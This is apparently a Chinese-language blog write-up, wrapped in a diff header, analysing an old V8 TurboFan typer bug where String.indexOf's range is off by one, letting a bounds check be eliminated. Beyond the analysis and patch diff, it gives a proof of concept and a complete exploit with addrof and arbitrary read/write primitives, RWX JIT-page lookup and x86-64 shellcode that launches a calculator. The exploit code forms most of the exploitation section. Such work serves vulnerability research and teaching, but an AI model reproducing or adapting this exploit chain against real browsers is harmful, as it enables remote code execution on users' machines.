@@ -1,0 +1,297 @@
+这是A guided tour through Chrome's javascript compiler上的第二个漏洞，下面是对应的commit
+
+![image-20210707154421546](https://image.3001.net/images/20211124/1637725451_619db50bb7c9dfaefd323.png!small)
+
+## 环境搭建
+
+用`v8-action`
+
+    
+    
+    env:
+      PATCH_FLAG: true
+      COMMIT: d2da19c78005c75e0f658be23c28b473dd76b93b  #这里
+      DEPOT_UPLOAD: false
+      SRC_UPLOAD: true
+      BINARY_UPLOAD: false
+    
+
+### 编译
+
+    
+    
+    cd v8
+    tools/dev/v8gen.py x64.debug
+    ninja -C out.gn/x64.debug d8
+    tools/dev/v8gen.py x64.release
+    ninja -C out.gn/x64.release d8
+    cd ..
+    
+
+## 漏洞分析
+
+    
+    
+    diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
+    index e04b1fb..251a946 100644
+    --- a/src/compiler/typer.cc
+    +++ b/src/compiler/typer.cc
+    @@ -1453,7 +1453,7 @@
+               return Type::String();
+             case kStringIndexOf:
+             case kStringLastIndexOf:
+    -          return Type::Range(-1.0, String::kMaxLength - 1.0, t->zone());
+    +          return Type::Range(-1.0, String::kMaxLength, t->zone());
+             case kStringEndsWith:
+             case kStringIncludes:
+               return Type::Boolean();
+    
+
+可以看到原本的`String`的最大下标是`Range(-1.0, kMaxLength -1.0)`，因为很显然，当只有一个元素时，最大下标就是`1-1->0`
+
+但是有一特殊情况：
+
+    
+    
+    '1234'.indexOf('', 4) == 4
+    
+
+不只是这样，我们可以任意长度的array，从其`maxLength`开始搜索 **空** 字符，返回其`maxLength`，而`Inferred
+Type`为`range(-1，maxLength-1)`这种潜在的返回值可以帮助我们数组越界，当然我们要通过`indexOf`源码来分析。
+
+[关于indexOf ](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/indexOf)
+
+    
+    
+    str.indexOf(searchValue [, fromIndex])
+    
+
+返回在当前字符串中从`fromIndex`开始的第一个`searchValue`对应的下标，但是当我们像上述说的搜索空字符且从大于等于数组长度的位置搜索时，会返回数组长度（这点在下面的源码分析中会有所体现），等下用`turbolizer`看下生成图。
+
+写个poc测一下，顺便看看`turbolizer`
+
+    
+    
+    function hex(i){
+        return i.toString(16).padStart(16, "0");
+    }
+    
+    function foo(x)
+    {
+    	// const maxLength = %StringMaxLength();
+    	// print(maxLength);
+    	//maxLength==2**30+25
+        let a = 'A'.repeat(2**30-25).indexOf('',x);
+        let b = a + 25;
+        let c = b >> 30;
+        let idx = 7 * c;
+        // print(idx);
+        let oobArray = [1.1,2.2,3.3,4.4];
+        oobArray[idx] = -1;
+        return oobArray;
+    }
+    
+    for(let i=0; i<10000; i++) {
+        foo(1)
+    }
+    let oob = foo(2**30-25);
+    console.log("[*]oob.length: "+hex(oob.length));
+    
+
+![image-20210707221920042](https://image.3001.net/images/20211124/1637725452_619db50cd4ef12c9dfebb.png!small)
+
+我本来想像[这里](https://docs.google.com/presentation/d/1DJcWByz11jLoQyNhmOvkZSrkgcVhllIlCHmal1tGzaw/edit#slide=id.g52a72d9904_0_52)的一样做，然后很简单的几步做出一个可以拿来越界的下标，但是很遗憾我本地如此求出的下标，在优化后他就是0，这个操作让人比较迷惑，另外在本地测试时最好看一下`%StringMaxLength()`的具体数值，那个slide里是`2**28-16`我本地是`2**30-25`还是试出来的，这是非常重要的一点。
+
+所幸在[这里](https://www.anquanke.com/post/id/216677#h3-5)看到他的exp写法，他的poc跑出结果和我不同，我本地跑出来的结果太过正常，看起来似乎没漏洞，但是返回越界写入length的array的poc在我本地倒是能跑通，感谢，不然这种莫名奇妙的错误不知会卡我多久。
+
+![image-20210707220503797](https://image.3001.net/images/20211124/1637725453_619db50dd5572922186db.png!small)
+
+在这一阶段时看到还有`CheckBounds`防止越界，但是在`Simplified
+lowering`阶段就没了那个越界检查，说明其`turbofan`认为这里不会越界，所以就把`CheckBound`给消除了，但是实际上越界了，所以会把checkbound消除（重点，这类漏洞的重点就是把一些check给消除掉。
+
+![image-20210707220725295](https://image.3001.net/images/20211124/1637725454_619db50ec537a9d029a94.png!small)
+
+这一错误的判断，也即消除checkbound是因为：
+
+![image-20210707221140846](https://image.3001.net/images/20211124/1637725455_619db50fb8bd4b7b68cb7.png!small)
+
+注意我用的不是`2**28`，显然turbofan在优化时确定的范围显示其不会越界，所以就会把checkbound消去，单这么看也许会觉得莫名其妙，那么我写个自己假设的修复漏洞之后的图表：
+
+Inferred Type| Actual value  
+---|---  
+R(-1,2^28-16)| 2^28-16  
+R(15,2^28)| 2^28  
+R(0,1)| 1  
+R(0,0x414141)| 0x414141  
+  
+那么这样的话显然是不会让`CheckBound`消失的。
+
+## 源码分析
+
+    
+    
+    int String::IndexOf(Isolate* isolate, Handle<String> receiver,
+                        Handle<String> search, int start_index) {
+      DCHECK(0 <= start_index);			//开始的下标大于0
+      DCHECK(start_index <= receiver->length()); //开始的下标小于主字符串的长度
+    
+      uint32_t search_length = search->length();  //需要搜索字符串的长度
+      if (search_length == 0) return start_index;  //如果是空字符串，返回搜索开始的下标
+    
+      uint32_t receiver_length = receiver->length();
+      if (start_index + search_length > receiver_length) return -1;
+    
+      receiver = String::Flatten(receiver);
+      search = String::Flatten(search);
+    
+      DisallowHeapAllocation no_gc;  // ensure vectors stay valid
+      // Extract flattened substrings of cons strings before getting encoding.
+      String::FlatContent receiver_content = receiver->GetFlatContent();
+      String::FlatContent search_content = search->GetFlatContent();
+    
+      // dispatch on type of strings
+      if (search_content.IsOneByte()) {
+        Vector<const uint8_t> pat_vector = search_content.ToOneByteVector();
+        return SearchString<const uint8_t>(isolate, receiver_content, pat_vector,
+                                           start_index);
+      }
+      Vector<const uc16> pat_vector = search_content.ToUC16Vector();
+      return SearchString<const uc16>(isolate, receiver_content, pat_vector,
+                                      start_index);
+    }
+    
+
+## 利用
+
+我们看到通过poc，可以达到构造一个越界读的数组的结果，并且这一poc的构建看起来并不算特别难，且其原理也在前面有所讲解，我相信各位通过曾经一些v8的学习，拿到可以有oob数组的poc后可以很快的写出其exp，有越界数组之后的操作就不再多说
+
+另外这个v8的版本挺老的v6.3的，我用wasm时候没触发应该是这个版本还不支持，最后直接拿[这里](https://www.anquanke.com/post/id/216677#h2-9)所说的jit稍加修改：
+
+    
+    
+    function hex(i)
+    {
+        return i.toString(16).padStart(16, "0");
+    }
+    
+    const MAX_ITERATIONS = 10000;
+    const buf = new ArrayBuffer(8);
+    const f64 = new Float64Array(buf);
+    const u32 = new Uint32Array(buf);
+    
+    function f2i(val)
+    { 
+        f64[0] = val;
+        let tmp = Array.from(u32);
+        return tmp[1] * 0x100000000 + tmp[0];
+    }
+    
+    function i2f(val)
+    {
+        let tmp = [];
+        tmp[0] = parseInt(val % 0x100000000);
+        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
+        u32.set(tmp);
+        return f64[0];
+    }
+    
+    let obj = [];
+    let ABuffer = [];
+    
+    function foo(x)
+    {
+        let b = 'A'.repeat(2**30-25).indexOf('',x);
+        let a = b + 25;
+        let c = a >> 30;
+        let idx = 7 * c;
+        // print(idx);
+        let oobArray = [1.1,2.2,3.3,4.4];
+        oobArray[idx] = -1;//i2f(0x202000000000);
+        return oobArray;
+    }
+    
+    foo(1);
+    foo(1);
+    for(let i=0; i<MAX_ITERATIONS; i++) {
+        foo(1)
+    }
+    let oob = foo(2**30-25);
+    console.log("[*] oob.length: "+hex(oob.length));
+    obj.push({mark:i2f(0x11111111),n:i2f(0x41414141)});
+    ABuffer.push(new ArrayBuffer(0x200));
+    
+    var off_buffer = 0;
+    var off_obj = 0;
+    
+    for(var i=0;i<500;i++)
+    {
+        let tmp = oob[i];
+        if(f2i(tmp) == 0x11111111)
+        {
+            off_obj = i+1;
+            break;
+        }
+    }
+    
+    for(var i=0;i<500;i++)
+    {
+        let tmp = oob[i];
+        if(f2i(tmp) == 0x0000020000000000)
+        {
+            off_buffer = i+1;
+            break;
+        }
+    }
+    
+    console.log("[+] off_obj    @"+off_obj);
+    console.log("[+] off_buffer   @"+off_buffer);
+    let dataView = new DataView(ABuffer[ABuffer.length-1]);
+    
+    function addrof(x)
+    {
+        obj[0].n = x;
+        return f2i(oob[off_obj]);
+    }
+    
+    function abread(addr)
+    {
+        oob[off_buffer] = i2f(addr);
+        return f2i(dataView.getFloat64(0,true));
+    }
+    
+    function abwrite(addr,payload)
+    {
+        oob[off_buffer] = i2f(addr);
+        for(let i=0; i<payload.length; i++) {
+            dataView.setUint8(i, payload[i]);
+        }
+    }
+    var jit = new Function("var a=1000000");
+    
+    var jit_addr = addrof(jit) - 1;
+    console.log("jit_addr ==> 0x"+jit_addr.toString(16))
+    var rwx_addr = abread(jit_addr+0x38) - 1 + 0x60
+    console.log("rwx_addr ==> 0x"+rwx_addr.toString(16))
+    
+    var shellcode = [0x48,0xb8,0x2f,0x78,0x63,0x61,0x6c,0x63,0x0,0x0,0x50,0x48,0xb8,
+    0x2f,0x75,0x73,0x72,0x2f,0x62,0x69,0x6e,0x50,0x48,0x89,0xe7,0x48,
+    0x31,0xc0,0x50,0x57,0x48,0x89,0xe6,0x48,0x31,0xd2,0x48,0xc7,0xc0,
+    0x3a,0x31,0x00,0x00,0x50,0x48,0xb8,0x44,0x49,0x53,
+    0x50,0x4c,0x41,0x59,0x3d,0x50,0x48,0x89,0xe2,0x48,0x31,0xc0,0x50,
+    0x52,0x48,0x89,0xe2,0x48,0xc7,0xc0,0x3b,0x00,0x00,0x00,0x0f,0x05];
+    
+    abwrite(rwx_addr,shellcode);
+    jit();
+    
+
+![image-20210707230624169](https://image.3001.net/images/20211124/1637725456_619db510e3decef7b9a9e.png!small)
+
+我也一直在思考shellcode跑不通的原因，每次都是display的环境变量和别人不一样，如果你用我的exp跑不通，也可以去进行新的尝试。
+
+### 参考
+
+<https://docs.google.com/presentation/d/1DJcWByz11jLoQyNhmOvkZSrkgcVhllIlCHmal1tGzaw/edit#slide=id.g51fa47cbd3_0_0>
+
+[Chrome issue 762874 - 安全客，安全资讯平台
+(anquanke.com)](https://www.anquanke.com/post/id/216677)
+
